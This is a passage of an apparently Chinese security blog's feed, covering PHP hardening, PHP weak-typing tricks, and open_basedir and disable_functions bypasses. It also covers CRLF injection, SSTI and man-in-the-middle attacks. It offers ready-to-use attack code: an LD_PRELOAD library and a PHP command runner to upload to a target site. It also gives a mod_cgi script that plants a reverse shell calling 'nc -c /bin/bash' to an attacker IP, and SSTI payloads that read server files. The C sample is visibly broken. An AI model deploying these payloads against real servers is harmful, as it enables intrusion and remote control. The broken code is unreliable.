href="#设置open-basedir-var-www-html" class="headerlink" title="设置open_basedir= /var/www/html"></a><strong>设置open_basedir</strong>= /var/www/html</h3><p>限制 PHP 脚本能访问的目录，一定程度下可降低Webshell的危害</p><h3 id="禁用危险函数"><a href="#禁用危险函数" class="headerlink" title="禁用危险函数"></a><strong>禁用危险函数</strong></h3><p>如果不希望执行包括<code>system()</code>等在内的执行命令的 PHP 函数</p><p>以及能够查看 PHP 信息的<code>phpinfo()</code>等函数</p><p>可以通过以下设置禁止这些函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">disable_functions = phpinfo, system, passthru, exec, shell_exec, popen, escapeshellarg, escapeshellcmd, proc_close, proc_open, dl</span><br></pre></td></tr></table></figure><h3 id="打开magic-quotes-gpc魔术引号"><a href="#打开magic-quotes-gpc魔术引号" class="headerlink" title="打开magic_quotes_gpc魔术引号"></a><strong>打开magic_quotes_gpc魔术引号</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">magic_quotes_gpc = on</span><br></pre></td></tr></table></figure><p>魔术引号自动过滤 GET/POST/COOKIE 可以防止SQL注入</p><p>但是 php&lt;5.4不会处理$_SERVER(client-ip/referer注入)  详情参见<a href="https://www.seebug.org/vuldb/ssvid-30102" target="_blank" rel="noopener">CVE-2012-0831</a></p><h3 id="关闭注册全局变量"><a href="#关闭注册全局变量" class="headerlink" title="关闭注册全局变量"></a><strong>关闭注册全局变量</strong></h3><p>在 PHP 环境中提交的变量，包括使用 POST 或者 GET 命令提交的变量</p><p>都将自动注册为全局变量，能够被直接访问 (PHP&lt;5.4.0)。</p><p>这对服务器是非常不安全的，应该将注册全局变量的选项关闭，禁止将所提交的变量注册为全局变量。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">register_globals = off</span><br></pre></td></tr></table></figure><h3 id="关闭-PHP-版本信息在-HTTP-头中的泄露"><a href="#关闭-PHP-版本信息在-HTTP-头中的泄露" class="headerlink" title="关闭 PHP 版本信息在 HTTP 头中的泄露"></a><strong>关闭 PHP 版本信息在 HTTP 头中的泄露</strong></h3><p>为了防止黑客获取服务器中 PHP 版本的信息，可以禁止该信息在 HTTP 头部内容中泄露</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">expose_php = off</span><br></pre></td></tr></table></figure><h3 id="错误信息控制"><a href="#错误信息控制" class="headerlink" title="错误信息控制"></a><strong>错误信息控制</strong></h3><p>一般 PHP 环境在没有连接到数据库或者其他情况下会有错误提示信息</p><p>错误信息中可能包含 PHP 脚本当前的路径信息或者查询的 SQL 语句等信息</p><p>这类信息如果暴露给黑客是不安全的，应该禁止该错误提示：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">display_errors = Off</span><br></pre></td></tr></table></figure><p>如果确实要显示错误信息，一定要设置显示错误信息的级别。</p><p>例如，只显示警告以上的错误信息：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting = E_WARNING &amp; E_ERROR</span><br></pre></td></tr></table></figure><h3 id="错误日志"><a href="#错误日志" class="headerlink" title="错误日志"></a><strong>错误日志</strong></h3><p>建议在关闭错误提示信息后，对于错误信息进行记录，便于排查服务器运行异常的原因：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">log_errors = On</span><br></pre></td></tr></table></figure><p>同时，需要设置错误日志存放的目录，将 PHP 错误日志与 Apache 的日志存放在同一目录下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">error_log &#x3D; &#x2F;usr&#x2F;local&#x2F;apache2&#x2F;logs&#x2F;php_error.log</span><br></pre></td></tr></table></figure><p><strong>注意</strong>： 该文件必须设置允许 Apache 用户或用户组具有写的权限。</p><h1 id="PHP的-00-截断的原理是什么？"><a href="#PHP的-00-截断的原理是什么？" class="headerlink" title="PHP的 %00 截断的原理是什么？"></a>PHP的 %00 截断的原理是什么？</h1><p><strong><code>存在于 &lt; 5.3.4版本</code>，GPC关闭</strong>，一般利用在对文件进行操作时，如文件上传时文件名的截断</p><p>如<code>filename=test.php%00.txt</code> 会被截断成test.php，00后面的被忽略</p><p>系统在对文件名读取时候，如果遇到0x00,就会认为读取已经结束了</p><blockquote><p>因为PHP使用C语言编写，C语言的字符串结束标志是字符 <code>\0</code> ，它的ASCII码值是 0</p></blockquote><h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><p>如果用<code>==</code>比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p><p><code>0e</code>开头的字符串等于0</p><p>进行比较运算时，如果遇到了<code>0e\d+</code>这种字符串，就会将这种字符串解析为科学计数法  </p><p><strong>0e开头的MD5和原字符串（用于MD5碰撞）</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?kekeyy1[]=xxx&amp;kekeyy2[]=123</span><br></pre></td></tr></table></figure><p>md5()函数无法处理数组，如果传入的为数组，会返回NULL</p><p>所以两个数组经过加密后得到的都是NULL,也就是相等的</p><p><strong>值为NULL的MD5：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e</span><br></pre></td></tr></table></figure><p><strong>strcmp()：</strong>需要给strcmp()传递2个string类型的参数</p><blockquote><p>如果str1小于str2,返回-1，相等返回0，否则返回1</p><p>strcmp比较出错 =&gt; 返回NULL =&gt; NULL==0 =&gt; get flag!</p></blockquote><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><p><strong>$$容易引发变量覆盖</strong></p><blockquote><p>$GLOBALS — 引用全局作用域中可用的全部变量        (PHP手册)</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$args=GLOBALS 和 var_dump($$args) 前面那个 $ 组成 $GLOBALS</span><br></pre></td></tr></table></figure><h1 id="PHP伪随机数爆破"><a href="#PHP伪随机数爆破" class="headerlink" title="PHP伪随机数爆破"></a>PHP伪随机数爆破</h1><blockquote><p>每一次调用mt_rand()函数的时候，都会检查一下系统有没有播种</p><p>PHP的mt_rand()函数生成的随机数只跟seed和调用该函数的次数有关。</p></blockquote><p>当得到seed数值后，就可以预测出接下来的数值是多少，这是该函数的一个问题，它并不能起到一个真随机数的作用</p><p>seed获取需要利用一个爆破工具：<a href="https://github.com/lepiaf/php_mt_seed" target="_blank" rel="noopener">https</a><a href="https://github.com/lepiaf/php_mt_seed" target="_blank" rel="noopener">://github.com/</a><a href="https://github.com/lepiaf/php_mt_seed" target="_blank" rel="noopener">lepiaf</a><a href="https://github.com/lepiaf/php_mt_seed" target="_blank" rel="noopener">/</a><a href="https://github.com/lepiaf/php_mt_seed" target="_blank" rel="noopener">php_mt_seed</a></p><h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><p>把题目给的生成的一组随机数的第一个数用作爆破</p><p>可能爆破出来多个种子，自己本地测试下</p><p>题目：srand.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"PHP 7.x"</span>;</span><br><span class="line">mt_srand(xxxxxxxx);</span><br><span class="line"><span class="comment"># We can't tell you what is xxxxxxxx!</span></span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"echo flag&#123;"</span>.mt_rand().<span class="string">"&#125;"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">984489752</span></span><br><span class="line"><span class="number">619387123</span></span><br><span class="line"><span class="number">2070958802</span></span><br><span class="line"><span class="number">2105559368</span></span><br><span class="line"><span class="number">1909473866</span></span><br><span class="line"><span class="number">1679323715</span></span><br><span class="line"><span class="number">1910332168</span></span><br><span class="line"><span class="number">640569646</span></span><br><span class="line"><span class="number">1103001695</span></span><br><span class="line"><span class="number">1871111424</span></span><br><span class="line">flag</span><br><span class="line"></span><br><span class="line">So, Please guess the flag!</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./php_mt_seed 984489752</span><br></pre></td></tr></table></figure><h1 id="绕过Open-basedir列目录"><a href="#绕过Open-basedir列目录" class="headerlink" title="绕过Open_basedir列目录"></a>绕过Open_basedir列目录</h1><h3 id="1、system命令执行函数绕过"><a href="#1、system命令执行函数绕过" class="headerlink" title="1、system命令执行函数绕过"></a>1、system命令执行函数绕过</h3><blockquote><p> open_basedir 的设置对system等命令执行函数是无效的，所以可以用命令执行函数来访问限制目录</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">system(<span class="string">"cat ../../../../../etc/passwd"</span>);</span><br></pre></td></tr></table></figure><p> 但是命令执行函数一般都会被限制在disable_function当中，所以我们需要寻找其他的途径来绕过限制 </p><h3 id="2、glob-数据流包装器"><a href="#2、glob-数据流包装器" class="headerlink" title="2、glob:// 数据流包装器"></a>2、glob:// 数据流包装器</h3><blockquote><p>glob是用来筛选目录的伪协议，筛选时不受<code>open_basedir</code>制约 </p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( $b = opendir(<span class="string">"glob:///var/www/html/*.php"</span>) ) &#123;<span class="keyword">while</span> ( ($file = readdir($b)) !== <span class="keyword">false</span> ) &#123;<span class="keyword">echo</span> <span class="string">"filename:"</span>.$file.<span class="string">"\n"</span>;&#125;closedir($b);&#125;</span><br></pre></td></tr></table></figure><p>更多方法参见<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">P牛的博客</a></p><h1 id="绕过disable-fuction"><a href="#绕过disable-fuction" class="headerlink" title="绕过disable_fuction"></a>绕过disable_fuction</h1><h3 id="利用DL-函数"><a href="#利用DL-函数" class="headerlink" title="利用DL()函数"></a><strong>利用DL()函数</strong></h3><p>dl( ) 函数允许在php脚本里动态加载php模块，默认是加载extension_dir目录里的扩展</p><p>该选项是PHP_INI_SYSTEM范围可修改的，只能在php.ini或者apache主配置文件里修改。</p><p>也可以通过enable_dl选项来关闭动态加载功能，而这个选项默认为On的</p><p>可以用<code>../</code>这种目录遍历的方式指定加载任何一个目录里的so等扩展文件</p><p>所以我们可以上传自己的so文件，并且用dl函数加载这个so文件执行命令</p><h3 id="LD-PRELOAD-环境变量"><a href="#LD-PRELOAD-环境变量" class="headerlink" title="LD_PRELOAD 环境变量"></a><strong>LD_PRELOAD 环境变量</strong></h3><p>LD_PRELOAD 是Linux的环境变量，它允许定义在程序运行前优先加载的动态链接库 </p><p>在php中，可使用putenv()函数设置LD_PRELOAD环境变量来加载指定的so文件</p><p>so文件中包含自定义函数进行劫持从而达到执行恶意命令的目的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//bypass_disablefuc.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = getenv(<span class="string">"EVIL_CMDLINE"</span>);</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    system(cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//编译成动态链接库</span></span><br><span class="line">gcc -shared -fPIC bypass_disablefuc.c -o bypass_disablefunc_x64.so</span><br><span class="line">    </span><br><span class="line"><span class="comment">//若目标为 x86 架构，需要加上 -m32</span></span><br><span class="line">gcc -shared -fPIC bypass_disablefuc.c -m32 -o bypass_disablefunc_x32.so</span><br></pre></td></tr></table></figure><p>再写一个PHP， 用putenv添加环境变量(一个是上传的so库地址、一个是要执行的命令)。</p><p>将system命令输出内容写入指定文件，然后读出。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//bypass_disablefunc.php </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$cmd = $_REQUEST[<span class="string">"cmd"</span>];</span><br><span class="line">   $out_path = $_REQUEST[<span class="string">"outpath"</span>];</span><br><span class="line">   $evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">   putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line">   $so_path = $_REQUEST[<span class="string">"sopath"</span>];</span><br><span class="line">   putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line">   mail(<span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>);</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将编译成的<strong>动态链接库</strong>和<strong>php文件</strong>上传到目标网站根目录。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用法如下</span></span><br><span class="line">http://xx.com/bypass_disablefunc.php?cmd=ls&amp;outpath=/tmp/ss&amp;sopath=/var/www/html/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure><blockquote><p>PHP 支持putenv()、mail() 即可，甚至无需安装 sendmail。 (<strong>此方法还可用于过WAF</strong>)</p></blockquote><h3 id="Fastcgi-PHP-FPM"><a href="#Fastcgi-PHP-FPM" class="headerlink" title="Fastcgi/PHP-FPM"></a><strong>Fastcgi/PHP-FPM</strong></h3><p>Fastcgi 是一种通讯协议，用于Web服务器与后端语言的数据交换；</p><p>PHP-FPM 则是php环境中对Fastcgi协议的管理程序实现</p><p>Nginx为fastcgi 提供了 fastcgi_param 来主要处理映射关系，将 Nginx 中的变量翻译成 PHP 能够理解的变量</p><p><a href="https://github.com/AntSwordProject/ant_php_extension" target="_blank" rel="noopener">蚁剑扩展</a>，用相应版本php编译即可 </p><h3 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a><strong>Apache Mod CGI</strong></h3><p>Mod CGI就是把PHP做为APACHE一个内置模块，</p><p>让apache http服务器本身能够支持PHP语言，不需要每一个请求都通过启动PHP解释器来解释PHP</p><p>它可以将cgi-script文件或者用户自定义标识头为cgi-script的文件通过服务器运行</p><p>在phpinfo看到<code>Server API -&gt; CGI/FastCGI</code>，就可以确定是以cgi模式运行的了。</p><p><strong>要求</strong></p><blockquote><ol><li>apache且运行mod_cgi模式</li><li>web目录可写</li><li>允许.htaccess生效</li></ol></blockquote><p>在.htaccess 中添加以下内容，指定.dazzle为结尾的文件为CGI脚本程序并且允许本目录执行，我们只要同时上传一个.dazzle的shell就可以了。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .dizzle</span><br></pre></td></tr></table></figure><p>现成payload - 》反弹shell：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">"nc -c '/bin/bash' 攻击者IP 6666"</span>; <span class="comment">//command to be executed</span></span><br><span class="line">$shellfile = <span class="string">"#!/bin/bash\n"</span>; <span class="comment">//using a shellscript</span></span><br><span class="line">$shellfile .= <span class="string">"echo -ne \"Content-Type: text/html\\n\\n\"\n"</span>; <span class="comment">//header is needed, otherwise a 500 error is thrown when there is output</span></span><br><span class="line">$shellfile .= <span class="string">"$cmd"</span>; <span class="comment">//executing $cmd</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkEnabled</span><span class="params">($text,$condition,$yes,$no)</span> //<span class="title">this</span> <span class="title">surely</span> <span class="title">can</span> <span class="title">be</span> <span class="title">shorter</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$text: "</span> . ($condition ? $yes : $no) . <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'checked'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    @file_put_contents(<span class="string">'.htaccess'</span>, <span class="string">"\nSetEnv HTACCESS on"</span>, FILE_APPEND); <span class="comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span></span><br><span class="line">    header(<span class="string">'Location: '</span> . $_SERVER[<span class="string">'PHP_SELF'</span>] . <span class="string">'?checked=true'</span>); <span class="comment">//execute the script again to see if the htaccess test worked</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $modcgi = in_array(<span class="string">'mod_cgi'</span>, apache_get_modules()); <span class="comment">// mod_cgi enabled?</span></span><br><span class="line">    $writable = is_writable(<span class="string">'.'</span>); <span class="comment">//current dir writable?</span></span><br><span class="line">    $htaccess = !<span class="keyword">empty</span>($_SERVER[<span class="string">'HTACCESS'</span>]); <span class="comment">//htaccess enabled?</span></span><br><span class="line">        checkEnabled(<span class="string">"Mod-Cgi enabled"</span>,$modcgi,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">        checkEnabled(<span class="string">"Is writable"</span>,$writable,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">        checkEnabled(<span class="string">"htaccess working"</span>,$htaccess,<span class="string">"Yes"</span>,<span class="string">"No"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error. All of the above must be true for the script to work!"</span>; <span class="comment">//abort if not</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        checkEnabled(<span class="string">"Backing up .htaccess"</span>,copy(<span class="string">".htaccess"</span>,<span class="string">".htaccess.bak"</span>),<span class="string">"Suceeded! Saved in .htaccess.bak"</span>,<span class="string">"Failed!"</span>); <span class="comment">//make a backup, cause you never know.</span></span><br><span class="line">        checkEnabled(<span class="string">"Write .htaccess file"</span>,file_put_contents(<span class="string">'.htaccess'</span>,<span class="string">"Options +ExecCGI\nAddHandler cgi-script .dizzle"</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>); <span class="comment">//.dizzle is a nice extension</span></span><br><span class="line">        checkEnabled(<span class="string">"Write shell file"</span>,file_put_contents(<span class="string">'shell.dizzle'</span>,$shellfile),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>); <span class="comment">//write the file</span></span><br><span class="line">        checkEnabled(<span class="string">"Chmod 777"</span>,chmod(<span class="string">"shell.dizzle"</span>,<span class="number">0777</span>),<span class="string">"Succeeded!"</span>,<span class="string">"Failed!"</span>); <span class="comment">//rwx</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Executing the script now. Check your listener &lt;img src = 'shell.dizzle' style = 'display:none;'&gt;"</span>; <span class="comment">//call the script</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.anquanke.com/post/id/195686#h3-3" target="_blank" rel="noopener">通过Antsword看绕过disable_functions</a></p><h1 id="PHP安全练习网站"><a href="#PHP安全练习网站" class="headerlink" title="PHP安全练习网站"></a>PHP安全练习网站</h1><p><a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">https://www.ripstech.com/php-security-calendar-2017/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;何为代码审计？&quot;&gt;&lt;a href=&quot;#何为代码审计？&quot; class=&quot;headerlink&quot; title=&quot;何为代码审计？&quot;&gt;&lt;/a&gt;何为代码审计？&lt;/h1&gt;&lt;p&gt;代码审计（Code audit）是一种以发现程序错误，安全漏洞和违反程序规范为目标的源代码分析。&lt;/
      
    
    </summary>
    
    
      <category term="【1】Web安全" scheme="https://wintrysec.github.io/categories/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>CLRF和SSTI模板注入</title>
    <link href="https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8-CLRF+SSTI/"/>
    <id>https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8-CLRF+SSTI/</id>
    <published>2020-08-12T14:05:00.000Z</published>
    <updated>2020-08-12T09:21:56.897Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CRLF-HTTP头部注入"><a href="#CRLF-HTTP头部注入" class="headerlink" title="CRLF(HTTP头部注入)"></a>CRLF(HTTP头部注入)</h1><blockquote><p>CRLF是”回车 + 换行”（\r\n）的简称</p><p>在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的</p></blockquote><p>通过注入CRLF就可以控制header和body的分割线，向body或是header中注入些东西</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/?param=123%0d%0a%0d%0aheader: wintrysec</span><br></pre></td></tr></table></figure><h1 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h1><blockquote><p>服务器端模板提供了一种更加简单的方法来管理动态生成的HTML代码</p><p>可以在服务器端动态生成HTML页面，避免混乱的代码(HTML+PHP+python等~)</p><p>比如php Twig、python的django和flask都有自己的模板引擎</p></blockquote><p>服务端模板接受了用户插入的恶意数据，导致代码执行。</p><p>如果变量，用户可控，就会造成模板注入漏洞</p><p>如，模板执行了用户输入的表达式：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;2*10&#125;&#125;</span><br></pre></td></tr></table></figure><p>可用工具：<a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python tplmap.py -u <span class="string">'http://0.0.0.0:5000/?name=xksec'</span> <span class="comment">#探测漏洞</span></span><br></pre></td></tr></table></figure><p><strong>列目录</strong></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://0.0.0.0:5000/?name=&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.func_globals[%27linecache%27].__dict__[%27o%27+%27s%27].listdir(%27./%27)&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>读文件</strong></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://0.0.0.0:5000/?name=&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].read([].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].open("test_file.txt",[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].O_RDONLY),40)&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CRLF-HTTP头部注入&quot;&gt;&lt;a href=&quot;#CRLF-HTTP头部注入&quot; class=&quot;headerlink&quot; title=&quot;CRLF(HTTP头部注入)&quot;&gt;&lt;/a&gt;CRLF(HTTP头部注入)&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;CRLF是”回车 + 
      
    
    </summary>
    
    
      <category term="【1】Web安全" scheme="https://wintrysec.github.io/categories/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>中间人攻击和ARP欺骗</title>
    <link href="https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8-%E4%B8%AD%E9%97%B4%E4%BA%BA%E5%92%8CARP%E6%AC%BA%E9%AA%97/"/>
    <id>https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8-%E4%B8%AD%E9%97%B4%E4%BA%BA%E5%92%8CARP%E6%AC%BA%E9%AA%97/</id>
    <published>2020-08-12T14:04:00.000Z</published>
    <updated>2020-08-12T09:20:21.159Z</updated>
    
    <content type="html"><![CDATA[<h1 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h1><blockquote><p>攻击者在请求和响应传输途中，拦截并篡改内容。</p><p>对于 HTTP 来说，由于设计的简单，不需要太多步骤就可以进行监听和修改报文；</p><p>所以这里主要针对HTTPS协议， 目前并没有方法直接对这个协议进行攻击；</p><p>一般都是在建立 SSL 连接时，利用中间人获取到 CA证书、非对称加密的公钥、对称加密的密钥；</p><p>(有了这些条件才可以对请求和响应拦截篡改)</p><p>中间人攻击是一个（缺乏）相互认证的攻击；</p><p>由于客户端与服务器之间在<code>SSL</code>握手的过程中缺乏相互认证而造成的漏洞</p></blockquote><p><strong>中间人攻击有一个前提</strong>：需要截获到客户端与服务器通信的线路 </p><p>将抓包工具 (比如<a href="https://www.telerik.com/fiddler" target="_blank" rel="noopener">fiddler</a>)  设置成系统的网络访问代理服务器；</p><p>使得所有的网络访问请求都通过它来完成，从而实现了网络封包的截取和分析；</p><p>其它工具则是利用 <code>DNS</code>欺骗、<code>ARP</code>投毒、劫持网关等手段；</p><p>将客户端的请求重定向到攻击者的机器，以便进行网络抓包。</p><h1 id="防御中间人攻击的方案通常基于以下几种技术"><a href="#防御中间人攻击的方案通常基于以下几种技术" class="headerlink" title="防御中间人攻击的方案通常基于以下几种技术"></a>防御中间人攻击的方案通常基于以下几种技术</h1><p><strong>1.公钥基础建设</strong><br>使用PKI相互认证机制，客户端验证服务器，服务器验证客户端；</p><p>只验证服务器（单向认证），这样就造成了SSL握手环节的漏洞，而如果使用双向认证的的话，基本可以更强力的相互认证</p><p><strong>2.延迟测试</strong></p><p>例如使用复杂加密哈希函数进行计算以造成数十秒的延迟；</p><p>如果双方通常情况下都要花费20秒来计算，并且整个通讯花费了60秒计算才到达对方，这就能表明存在第三方中间人 </p><p><strong>3.使用其他形式的密钥交换形式</strong></p><h1 id="中间人攻击的取证分析"><a href="#中间人攻击的取证分析" class="headerlink" title="中间人攻击的取证分析"></a>中间人攻击的取证分析</h1><p>从被怀疑是中间人攻击的链接中捕捉网络数据包并进行分析可以确定是否存在中间人攻击。</p><p>在进行网络分析并对可疑的SSL中间人攻击进行取证时，重要的分析证据包括： </p><ul><li>远程服务器的IP地址</li><li>DNS域名解析服务器</li><li>X.509证书服务器 <ul><li>证书是自签名证书吗？</li><li>证书是由信任的颁发机构颁发的吗？</li><li>证书是否已被吊销？</li><li>证书最近被更改过吗？</li><li>在互联网上的其他的客户端是否也得到了相同的证书？</li></ul></li></ul><h1 id="SSL证书劫持-欺骗-攻击"><a href="#SSL证书劫持-欺骗-攻击" class="headerlink" 